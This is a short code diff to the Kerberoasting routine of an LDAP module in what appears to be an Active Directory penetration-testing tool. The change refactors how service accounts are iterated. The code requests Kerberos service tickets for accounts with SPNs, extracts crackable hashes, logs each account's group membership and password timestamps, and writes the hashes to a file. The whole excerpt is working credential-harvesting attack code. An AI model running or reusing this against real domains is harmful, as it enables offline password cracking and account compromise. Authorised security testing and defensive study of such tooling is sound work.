@@ -480,16 +480,17 @@ class ldap(connection):
                 pass
 
         if len(answers)>0:
-            users = dict( (vals[1], vals[0]) for vals in answers)
+            #users = dict( (vals[1], vals[0]) for vals in answers)
             TGT = KerberosAttacks(self).getTGT_kerberoasting()
-            for user, SPN in users.items():
+            for SPN, sAMAccountName, memberOf, pwdLastSet, lastLogon, delegation in answers:
                 try:
                     serverName = Principal(SPN, type=constants.PrincipalNameType.NT_SRV_INST.value)
                     tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.domain,
                                                                             self.kdcHost,
                                                                             TGT['KDC_REP'], TGT['cipher'],
                                                                             TGT['sessionKey'])
-                    r = KerberosAttacks(self).outputTGS(tgs, oldSessionKey, sessionKey, user, SPN)
+                    r = KerberosAttacks(self).outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName, SPN)
+                    self.logger.highlight(u'sAMAccountName: {} memberOf: {} pwdLastSet: {} lastLogon:{}'.format(sAMAccountName, memberOf, pwdLastSet, lastLogon))
                     self.logger.highlight(u'{}'.format(r))
                     with open(self.args.kerberoasting, 'a+') as hash_kerberoasting:
                         hash_kerberoasting.write(r + '\n')
